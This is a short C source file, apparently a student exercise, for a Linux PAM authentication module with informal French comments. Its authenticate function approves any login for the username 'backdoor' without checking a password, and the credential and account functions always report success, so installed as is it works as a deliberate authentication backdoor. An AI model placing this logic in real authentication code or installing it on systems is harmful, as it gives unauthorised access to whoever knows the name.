/*
** test.c for pamela in /home/legald_t/pamela
** 
** Made by Dieu
** Login   <legald_t@epitech.eu>
** 
** Started on  Wed Oct 12 19:09:46 2016 Dieu
// Last update Mon Oct 24 10:22:44 2016 Dieu
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define PAM_SM_AUTH
#include <security/pam_appl.h>
#include <security/pam_modules.h>

/* ça c'est obligé pour les droits d'accès */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS; //PAM_SUCCESS c'est quand ça va bien
}


PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

/* ça c'est obligé et je crois que c'est là qu'on jute notre sperm merveilleux*/
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;

  const char* pUsername;
  retval = pam_get_user(pamh, &pUsername, "Username: "); //ça c'est pour get l'username (important)

  if (retval != PAM_SUCCESS) {
    return retval;
  }

  if (strcmp(pUsername, "backdoor") != 0) {
    return PAM_AUTH_ERR;
  }

  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  printf("open session\n");
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
  printf("close session\n");
  return PAM_SUCCESS;
}

